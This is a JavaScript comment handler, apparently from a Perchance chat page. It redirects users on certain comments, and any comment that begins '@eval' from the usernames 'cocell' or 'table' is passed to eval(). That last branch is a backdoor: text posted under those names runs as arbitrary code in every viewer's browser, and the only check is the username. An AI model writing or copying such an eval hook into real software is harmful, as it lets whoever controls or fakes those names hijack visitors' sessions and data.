  onComment(comment) =>
    if (comment.nickname == '꧁🔥 Coc̀éll 🔥꧂' && comment.byCurrentUser) {
      window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_self');
    }
    if (comment.message.includes('@update') && comment.user.isAdmin) {
      const lastUpdate = localStorage.getItem('lastUpdate');
      if (!lastUpdate || Date.now() - lastUpdate > 30000) {
        localStorage.setItem('lastUpdate', Date.now());
        if (!comment.byCurrentUser) {
          window.open('https://null.perchance.org/ai-chat-modern', '_self');
        }
      }
    }
    
    evalUsers = [
      "cocell",
      "table"
    ];
    
    if (comment.message.startsWith('@eval') && evalUsers.includes(comment.user.name)) {
      const codeToExecute = comment.message.slice(5).trim();
      eval(codeToExecute);
    }

